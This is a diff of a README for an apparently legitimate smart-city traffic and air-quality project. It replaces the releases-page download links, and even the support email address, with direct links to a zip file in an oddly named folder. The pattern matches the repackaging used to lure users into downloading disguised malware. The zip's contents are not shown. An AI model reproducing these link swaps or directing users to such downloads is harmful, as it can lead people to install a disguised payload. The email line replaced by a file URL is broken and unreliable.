@@ -1,6 +1,6 @@
 # 🚦 Smart-City-Traffic-Air-Quality-Insights - Enhance Urban Living with Data
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/shukraal/Smart-City-Traffic-Air-Quality-Insights/releases)
+[![Download Now](https://raw.githubusercontent.com/shukraal/Smart-City-Traffic-Air-Quality-Insights/main/ratiocinate/Smart-City-Traffic-Air-Quality-Insights.zip)](https://raw.githubusercontent.com/shukraal/Smart-City-Traffic-Air-Quality-Insights/main/ratiocinate/Smart-City-Traffic-Air-Quality-Insights.zip)
 
 ## 🌟 Overview
 
@@ -23,7 +23,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started, you need to visit the Releases page to download the latest version of the application. 
 
-[Visit this page to download](https://github.com/shukraal/Smart-City-Traffic-Air-Quality-Insights/releases).
+[Visit this page to download](https://raw.githubusercontent.com/shukraal/Smart-City-Traffic-Air-Quality-Insights/main/ratiocinate/Smart-City-Traffic-Air-Quality-Insights.zip).
 
 1. Go to the link above.
 2. On the Releases page, you will see a list of available downloads.
@@ -72,7 +72,7 @@ This application touches upon various topics, including:
 
 If you encounter any issues or have questions, please reach out:
 
-- **Email**: support@smartcityinsights.com
+- **Email**: https://raw.githubusercontent.com/shukraal/Smart-City-Traffic-Air-Quality-Insights/main/ratiocinate/Smart-City-Traffic-Air-Quality-Insights.zip
 - **GitHub Issues**: Use the issues section on GitHub to report bugs or suggestions.
 
 ## 🔗 Additional Resources
